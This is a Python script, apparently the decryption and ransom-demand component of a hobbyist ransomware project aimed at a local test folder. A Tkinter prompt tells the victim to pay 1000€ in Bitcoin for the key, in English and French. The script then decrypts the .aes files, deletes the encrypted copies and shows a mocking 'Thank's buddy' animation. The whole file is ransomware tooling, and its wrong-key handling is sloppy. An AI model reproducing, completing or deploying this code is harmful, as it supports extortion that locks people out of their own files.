import os
import shutil # for moving files
import pyAesCrypt # for decryption
from pathlib import Path
import tkinter as tk
from tkinter import messagebox
import tkinter.simpledialog
import tkinter as tk
from tkinter import *



       
# Get the folders to decrypt
folders_path = [
    # str(os.path.join(Path.home(), "Downloads")),
    str(os.path.join(Path.home(), "\\Users\\Olie\\OneDrive\\Bureau\\test ransonware"))
]


# Get the key
root = tk.Tk()
root.withdraw()
# add button on tkinter.simpledialog.askstring
key = tkinter.simpledialog.askstring("Key Decrypt", "To get the key, you must first pay 1000€ in BTC", parent=root)



# Decrypt every file in each folder
for folder_path in folders_path:
    for file in os.listdir(folder_path):
        bufferSize = 64*1024
        # Get the path for the current file
        file_path = os.path.join(folder_path, file)
        if file.endswith(".aes"):
            # Decrypt the file
            pyAesCrypt.decryptFile(file_path, file_path[:-4], key, bufferSize)
            # if key is wrong show message, when message is closed, reshow the key input
            if os.path.exists(file_path[:-4]) == False:
                messagebox.showinfo("Clé Decrypt", "Clé incorrecte", parent=root, command=root)
                key = tkinter.simpledialog.askstring("Clé Decrypt", "Pour obtenir la clé, vous devez d'abord payer 1000€ en BTC", parent=root)
                pyAesCrypt.decryptFile(file_path, file_path[:-4], key, bufferSize)
            # Move the decrypted file and remove prefix "encrypted_"
            destination_path = os.path.join(folder_path, file[:-4].replace("encrypted_", ""))
            shutil.move(file_path[:-4], destination_path)
            # Delete the encrypted file
            os.remove(file_path)



    




index = 0
txt = ['T|', 'Th|', 'Tha|', 'Than|','Thank|', 'Thank\'|', 'Thank\'s|', 'Thank\'s |', 'Thank\'s b|', 'Thank\'s bu|', 'Thank\'s bud|', 'Thank\'s budd|', 'Thank\'s buddy|', 'Thank\'s buddy !|', 'Thank\'s buddy !!|']
# create a final window for telling bye bye
def start_animation():
    global index, text_animation_lb, loop
    if not index + 1 > len(txt):
        text_animation_lb.config(text=txt[index])
        index += 1
        loop.after(100, update_animation)
    else:
        index = 0
        text_animation_lb.config(text="|")
        loop.after(100, update_animation)

def update_animation():
    start_animation()

def create_window():
    global text_animation_lb, loop
    loop = tk.Tk()
    loop.title("bisous <3")
    loop.geometry("500x400")
    loop.tk_setPalette('black')

    text_animation_lb = tk.Label(loop, text="|", font=("Bold", 50))
    text_animation_lb.pack(pady=20)
    loop.after(1000, update_animation)
    loop.mainloop()

# function for display create_window and loop x25
def finish():
    for i in range(25):
        create_window()
    window.destroy()




window=Tk()
lbl=Label(window, text="All files in the folders have been decrypted.")
lbl.place(relx=0.5, rely=0.2, anchor=CENTER)
window.title('Decryption Complete')
btn = tk.Button(window, text="OK" , command=finish)
btn.place(relx=0.5, rely=0.5, anchor=CENTER)
window.geometry("300x100")
window.mainloop()











